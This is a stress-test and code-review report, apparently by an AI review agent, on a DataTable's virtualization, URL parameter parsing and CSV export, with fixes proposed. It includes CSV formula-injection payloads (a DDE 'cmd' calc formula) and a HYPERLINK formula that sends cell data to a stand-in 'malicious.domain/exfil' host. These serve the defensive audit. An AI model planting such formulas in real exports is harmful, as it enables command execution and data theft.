# Adversarial Challenge & Stress-Test Report: Milestone 3 Primitives

**Author**: `challenger_m3_1` (Empirical Challenger)  
**Target Milestone**: Milestone 3 (DataTable, Virtualization, URL State, Export)  
**Evaluated Components**:
- `apps/web/src/components/data-table/data-table.tsx`
- `apps/web/src/hooks/useTableUrlSync.ts`
- `apps/web/src/lib/export.ts` & `apps/web/src/components/data-table/export.ts`
- `apps/web/src/components/data-table/data-table-toolbar.tsx`
- `apps/web/src/components/data-table/data-table-pagination.tsx`

**Verdict**: **REQUEST_CHANGES**  
**Overall Risk Assessment**: **HIGH**

---

## 1. Observation

Direct empirical observations from codebase inspection and execution of empirical test harnesses (`.agents/challenger_m3_1/test_*.mjs`):

### 1.1 Virtualization & Row Expansion (`apps/web/src/components/data-table/data-table.tsx`)
- **Lines 105–110**:
  ```tsx
  const rowVirtualizer = useVirtualizer({
    count: rows.length,
    getScrollElement: () => tableContainerRef.current,
    estimateSize: estimateRowHeight,
    overscan,
  });
  ```
  `useVirtualizer` omits the `getItemKey` option.
- **Lines 236–255**:
  ```tsx
  {virtualItems.map((virtualRow) => {
    const row = rows[virtualRow.index];
    if (!row) return null;
    const isExpanded = row.getIsExpanded();

    return (
      <tbody
        key={row.id}
        ref={rowVirtualizer.measureElement}
        data-index={virtualRow.index}
        className={cn(
          'border-b border-border/60 transition-colors',
          row.getIsSelected() && 'bg-primary/5'
        )}
      >
        {/* Primary Row */}
        <tr ...>
  ```
- **Virtual-Core Inspection** (`@tanstack/virtual-core/dist/cjs/index.cjs` lines 31760–34500):
  When `getItemKey` is omitted, `virtualCore` defaults to `(index) => index`.
  `this.itemSizeCache.set(key, size)` caches dynamic heights using integer row indices (`0, 1, 2, ...`), rather than the row identity (`row.id`).
  When rows reorder during sorting or filtering, `itemSizeCache` retains the expanded height at the old array index.
  In empirical test `test_cache_sort_filter.mjs`, sorting/filtering with an expanded row caused the virtualizer to assign 52px to the expanded row and 250px to a collapsed row.

### 1.2 URL State Synchronization (`apps/web/src/hooks/useTableUrlSync.ts`)
- **Lines 27–33**:
  ```typescript
  const state: TableUrlState = useMemo(() => {
    const page = Math.max(1, parseInt(searchParams.get('page') || '1', 10));
    const pageSize = Math.max(
      10,
      parseInt(searchParams.get('pageSize') || String(defaultPageSize), 10)
    );
  ```
- In JavaScript, `parseInt('NaN', 10)` returns `NaN`. `Math.max(1, NaN)` evaluates to `NaN`.
- In empirical test `test_url_sync_empirical.mjs`:
  - `?page=NaN` or `?page=invalid` sets `state.page = NaN`.
  - `pagination.pageIndex` becomes `state.page - 1 = NaN`.
  - TanStack Table's pagination row model executes `data.slice(pageStart, pageEnd)` where `pageStart = pageSize * NaN = NaN`.
  - In JavaScript, `Array.prototype.slice(NaN, NaN)` evaluates to `[]`.
  - The table renders **zero rows**, completely breaking the grid display when invalid page strings are in the URL.
- Similarly, `?pageSize=NaN` produces `state.pageSize = NaN` and `data.slice(0, NaN)` returning `[]`.
- `?pageSize=1000000000`: `pageSize` has no upper bound clamp (only lower bound `Math.max(10, ...)`), allowing unbounded page size requests.
- **Lines 46–50**:
  ```typescript
  searchParams.forEach((value, key) => {
    if (!['page', 'pageSize', 'sort', 'search'].includes(key)) {
      filters[key] = value.split(',').filter(Boolean);
    }
  });
  ```
  When the query string contains empty commas (e.g. `?status=,,,,` or `?status=`), `filters['status']` is assigned `[]`.
  `columnFilters` is populated with `[{ id: 'status', value: [] }]`.
  TanStack Table treats this as an active filter, which matches 0 rows, wiping all rows from the display.

### 1.3 Export Primitives & CSV Formula Injection (`apps/web/src/lib/export.ts`)
- **Lines 14–21**:
  ```typescript
  export function escapeCsvCell(value: unknown): string {
    if (value === null || value === undefined) return '';
    let str = typeof value === 'object' ? JSON.stringify(value) : String(value);
    if (str.includes('"') || str.includes(',') || str.includes('\n') || str.includes('\r')) {
      str = `"${str.replace(/"/g, '""')}"`;
    }
    return str;
  }
  ```
- In empirical test `test_export_empirical.mjs`:
  - RFC 4180 escaping (double quotes `""`, commas, newlines `\r\n`, null/undefined) and German characters (`ä, ö, ü, ß`) with UTF-8 BOM `\uFEFF` pass.
  - **CSV Formula Injection (CWE-1236)**:
    - `=1+1` returned as `"=1+1"` (unquoted, unescaped)
    - `=cmd|'/C calc'!A0` returned as `"=cmd|'/C calc'!A0"`
    - `@SUM(A1:A10)` returned as `"@SUM(A1:A10)"`
    - `+12345` returned as `"+12345"`
    - `-5+2` returned as `"-5+2"`
    - `\t=cmd` returned as `"\t=cmd"`
    All formula payloads are emitted verbatim. When opened in Microsoft Excel or LibreOffice Calc, formulas execute automatically.
- **Lines 61 and 139**:
  ```typescript
  fileContent = '\uFEFF' + [headers.join(','), ...rowsContent].join('\r\n');
  ```
  Headers are joined using `headers.join(',')` without calling `escapeCsvCell(h)`.
  In empirical test `test_export_headers.mjs`, a column header containing a comma (`"Column, With, Commas"`) split into 3 separate CSV columns, breaking table alignment.

### 1.4 Verification Quality Gate Commands
Commands executed directly on repository:
1. `node scripts/check-no-dependency-soup.mjs`: Exit code 0 (100% compliant, 0 prohibited duplicate dependencies).
2. `npx pnpm --filter @erppreflight/web typecheck`: Exit code 0 (0 TypeScript errors).
3. `npx pnpm test`: Exit code 0 (8 packages in scope, 8 successful, 394 NestJS tests passed).
4. `py -m pytest services/analysis-python/tests -v`: Exit code 0 (296 tests passed).

---

## 2. Logic Chain

1. **Vulnerability 1 (CSV Formula Injection — Critical / Security)**:
   - Observation 1.3 shows `escapeCsvCell` checks only for `"`, `,`, `\n`, `\r`.
   - Any cell starting with `=, +, -, @, \t, \r` is emitted unchanged.
   - SAP finding titles, transport descriptions, object names, and user remarks are often exported via CSV.
   - If user-controllable data starts with `=` (e.g. `=cmd|' /C calc'!A0`), Excel executes it via DDE or evaluates external hyperlink formulas upon opening the CSV file.
   - Therefore, `escapeCsvCell` is vulnerable to CWE-1236 (CSV Formula Injection).

2. **Vulnerability 2 (Malformed URL Parameters Crash Table Display — Critical / Functional)**:
   - Observation 1.2 shows `Math.max(1, parseInt('NaN', 10))` yields `NaN`.
   - `pageIndex: state.page - 1` becomes `NaN`.
   - TanStack Table uses `data.slice(pageStart, pageEnd)`. When `pageStart` or `pageEnd` is `NaN`, `slice` yields `[]`.
   - A malformed URL like `/inspector?page=NaN` or `/projects?page=invalid` completely blanks the table.
   - The user cannot recover without manually clearing the browser URL query parameter.

3. **Vulnerability 3 (Empty Filter Array Wipes Records — High / Functional)**:
   - Observation 1.2 shows `filters[key] = value.split(',').filter(Boolean)` produces `[]` when `value` is empty or only commas (e.g. `?status=,,,,`).
   - `columnFilters` is populated with `{ id: 'status', value: [] }`.
   - TanStack Table treats `{ id: 'status', value: [] }` as an active filtering condition where no row satisfies the condition, resulting in 0 displayed records.

4. **Vulnerability 4 (Unbounded `pageSize` — Medium / DoS)**:
   - Observation 1.2 shows `Math.max(10, parseInt(pageSize))` has no upper limit clamp.
   - Setting `?pageSize=10000000` forces the client/server to fetch and process millions of records, triggering memory exhaustion or network latency.

5. **Vulnerability 5 (Virtualizer Cache Desynchronization during Sort/Filter — High / UX)**:
   - Observation 1.1 shows `useVirtualizer` omits `getItemKey`.
   - TanStack Virtual falls back to integer index keys.
   - The compound `<tbody>` pattern itself successfully combines primary and expanded rows under a single measured node for static row sets.
   - However, when rows are re-sorted or filtered while an expanded row exists, the measured height (`itemSizeCache`) remains mapped to the old array index instead of the data item's ID.
   - The newly moved collapsed row receives the expanded height (rendering blank white space), while the expanded row at its new index receives the baseline estimate (rendering clipped content) until remeasurement.

6. **Vulnerability 6 (Unescaped CSV Headers Break Column Alignment — High / Data Integrity)**:
   - Observation 1.3 shows `headers.join(',')` in `exportRawData` and `triggerExport` does not escape header values.
   - Any column with a comma or quotes in its header corrupts CSV column layout.

---

## 3. Adversarial Challenges & Stress-Test Matrix

### Challenge 1 [CRITICAL]: CSV Formula Injection (CWE-1236)
- **Assumption Challenged**: "RFC 4180 escaping is sufficient for CSV export safety."
- **Attack Scenario**: Attacker stages an SAP transport or custom code finding with title `=HYPERLINK("https://malicious.domain/exfil?d="&A1,"Click Here")` or `=cmd|'/C calc'!A0`. A security auditor exports the findings to CSV and opens it in Microsoft Excel.
- **Blast Radius**: Arbitrary command execution (via Excel DDE), credential exfiltration, or unauthorized URL navigation.
- **Mitigation**: In `escapeCsvCell(value)`, if the string value starts with `=, +, -, @, \t, \r`, prepend a single quote `'` before standard RFC 4180 quoting:
  ```typescript
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  ```

### Challenge 2 [CRITICAL]: URL `NaN` Parameter Grid Blackout
- **Assumption Challenged**: "`Math.max(1, parseInt(...))` safely handles non-numeric inputs."
- **Attack Scenario**: User clicks a link or enters a URL with `?page=NaN`, `?page=undefined`, or `?page=first`.
- **Blast Radius**: TanStack Table `pageIndex` becomes `NaN`, resulting in `data.slice(NaN, NaN) -> []`. The table renders 0 records and shows an empty state even though thousands of records exist.
- **Mitigation**: Validate with `Number.isFinite`:
  ```typescript
  const parsedPage = parseInt(searchParams.get('page') || '1', 10);
  const page = Number.isFinite(parsedPage) && parsedPage >= 1 ? parsedPage : 1;

  const parsedPageSize = parseInt(searchParams.get('pageSize') || String(defaultPageSize), 10);
  const pageSize = Number.isFinite(parsedPageSize)
    ? Math.min(500, Math.max(10, parsedPageSize))
    : defaultPageSize;
  ```

### Challenge 3 [HIGH]: Dynamic Height Measurement Cache Clashing Across Sort/Filter
- **Assumption Challenged**: "Virtualizer default key extractor is sufficient for dynamic-height tables with expandable rows."
- **Attack Scenario**: User expands a finding row (height grows from 52px to 300px), then clicks a column header to sort descending.
- **Blast Radius**: Virtualizer applies 300px height to whatever collapsed item now occupies that array index, leaving a 248px blank gap, while the expanded item at its new index is allocated 52px, clipping content.
- **Mitigation**: Pass `getItemKey` to `useVirtualizer` in `apps/web/src/components/data-table/data-table.tsx`:
  ```tsx
  getItemKey: React.useCallback((index: number) => rows[index]?.id ?? index, [rows]),
  ```

### Challenge 4 [HIGH]: Empty Filter String Injection
- **Assumption Challenged**: "`value.split(',').filter(Boolean)` safely strips empty filters."
- **Attack Scenario**: URL contains empty filter parameter: `?severity=,,,,` or `?status=`.
- **Blast Radius**: `columnFilters` is populated with `[{ id: 'status', value: [] }]`. TanStack Table treats `[]` as matching 0 records, emptying the grid.
- **Mitigation**: Only populate `filters[key]` if `parts.length > 0`:
  ```typescript
  const parts = value.split(',').filter(Boolean);
  if (parts.length > 0) {
    filters[key] = parts;
  }
  ```

### Challenge 5 [HIGH]: Unescaped CSV Header Row
- **Assumption Challenged**: "Table column headers never contain commas or quotes."
- **Attack Scenario**: Exporting a table where a column header is named `Rule, Category` or `Object "Type"`.
- **Blast Radius**: Header row splits into more columns than the data rows, corrupting CSV column alignment in Excel.
- **Mitigation**: Map headers through `escapeCsvCell(h)` before joining:
  ```typescript
  headers.map(escapeCsvCell).join(',')
  ```

---

## 4. Empirical Stress Test Results

| Test ID | Target / Scenario | Expected Behavior | Actual Behavior | Result |
|---|---|---|---|---|
| **ST-01** | `escapeCsvCell('Hello "World"')` | `"Hello ""World"""` | `"Hello ""World"""` | **PASS** |
| **ST-02** | `escapeCsvCell('A,B\r\nC')` | `"A,B\r\nC"` | `"A,B\r\nC"` | **PASS** |
| **ST-03** | `escapeCsvCell('Prüfung & Größe')` | Preserves German chars with UTF-8 BOM | Preserved with BOM `\uFEFF` | **PASS** |
| **ST-04** | `escapeCsvCell('=1+1')` | Neutralized (e.g. `'=1+1`) | `"=1+1"` (evaluates in Excel) | **FAIL (Vulnerable)** |
| **ST-05** | `escapeCsvCell('=cmd|\'/C calc\'!A0')` | Neutralized | `"=cmd|\'/C calc\'!A0"` | **FAIL (Vulnerable)** |
| **ST-06** | `escapeCsvCell('@SUM(A1:A10)')` | Neutralized | `"@SUM(A1:A10)"` | **FAIL (Vulnerable)** |
| **ST-07** | `headers.join(',')` with commas | Quoted header | Unquoted comma splits header | **FAIL (Corrupted)** |
| **ST-08** | `useTableUrlSync` on `?page=-5` | Clamped to 1 | Clamped to 1 | **PASS** |
| **ST-09** | `useTableUrlSync` on `?pageSize=0` | Clamped to 10 | Clamped to 10 | **PASS** |
| **ST-10** | `useTableUrlSync` on `?page=NaN` | Sanitized to 1 | Returns `NaN` (renders 0 rows) | **FAIL (Crash)** |
| **ST-11** | `useTableUrlSync` on `?pageSize=invalid` | Sanitized to default (50) | Returns `NaN` (renders 0 rows) | **FAIL (Crash)** |
| **ST-12** | `useTableUrlSync` on `?pageSize=1000000000` | Capped to max (e.g. 500) | 1,000,000,000 (uncapped) | **FAIL (DoS risk)** |
| **ST-13** | `useTableUrlSync` on `?status=,,,,` | Ignored (no active filter) | `[{ id: 'status', value: [] }]` (0 rows) | **FAIL (Wipes grid)** |
| **ST-14** | Compound `<tbody>` row expansion | Measures combined height | Measures combined height | **PASS** |
| **ST-15** | Virtualizer sort while row expanded | Preserves height by ID | Keys by index, swaps height onto wrong row | **FAIL (Cache clash)** |

---

## 5. Caveats

- End-to-end browser wheel scrolling smoothness and layout paint performance were evaluated via synthetic virtualizer instances and DOM node mocking; full Chromium GPU composition was not measured.
- The `exportToCsv` function referenced in the mission prompt corresponds to `escapeCsvCell` and `exportRawData` / `triggerExport` in `apps/web/src/lib/export.ts` and `apps/web/src/components/data-table/export.ts`.

---

## 6. Conclusion & Required Remediations

The foundational structure of the TanStack DataTable, Virtualization, and URL state synchronization in Milestone 3 is solid. In particular:
- The compound `<tbody>` pattern is well-architected for single-row dynamic expansions, cleanly avoiding sibling `<tr>` measurement collisions.
- The monorepo passes all existing quality gates (`check-no-dependency-soup.mjs`, web `typecheck`, and monorepo `test`).

However, **REQUEST_CHANGES** is mandated due to 2 critical bugs and 4 high/medium defects:
1. **Remediate CSV Formula Injection** in `apps/web/src/lib/export.ts` by prefixing cells starting with `[=+\-@\t\r]` with a single quote `'`.
2. **Remediate `NaN` URL Parameter Handling** in `apps/web/src/hooks/useTableUrlSync.ts` using `Number.isFinite(...)` to guarantee fallback to valid integers (`page = 1`, `pageSize = defaultPageSize`), and enforce an upper clamp on `pageSize` (`Math.min(500, ...)`).
3. **Remediate Empty Array Filters** in `apps/web/src/hooks/useTableUrlSync.ts` by only registering filters when `parts.length > 0`.
4. **Remediate Virtualizer Cache Desynchronization** in `apps/web/src/components/data-table/data-table.tsx` by providing `getItemKey: (index) => rows[index]?.id ?? index` to `useVirtualizer`.
5. **Escape CSV Column Headers** in `apps/web/src/lib/export.ts` using `headers.map(escapeCsvCell).join(',')`.

---

## 7. Verification Method

To independently verify these findings:
```bash
# 1. Run empirical test suites in .agents/challenger_m3_1/:
node --experimental-strip-types .agents/challenger_m3_1/test_export_empirical.mjs
node .agents/challenger_m3_1/test_export_headers.mjs
node .agents/challenger_m3_1/test_url_sync_empirical.mjs
node .agents/challenger_m3_1/test_pagination_nan.mjs
node .agents/challenger_m3_1/test_filter_empty_array.mjs

# 2. Run repository quality gates:
node scripts/check-no-dependency-soup.mjs
npx pnpm --filter @erppreflight/web typecheck
npx pnpm test
```
- Invalidation conditions:
  - If `escapeCsvCell('=1+1')` returns `'=1+1`, formula injection is resolved.
  - If `useTableUrlSync` with `?page=NaN` produces `state.page === 1` and `pageIndex === 0`, pagination crash is resolved.
  - If `useVirtualizer` includes `getItemKey: (index) => rows[index]?.id ?? index`, virtualizer cache desynchronization is resolved.
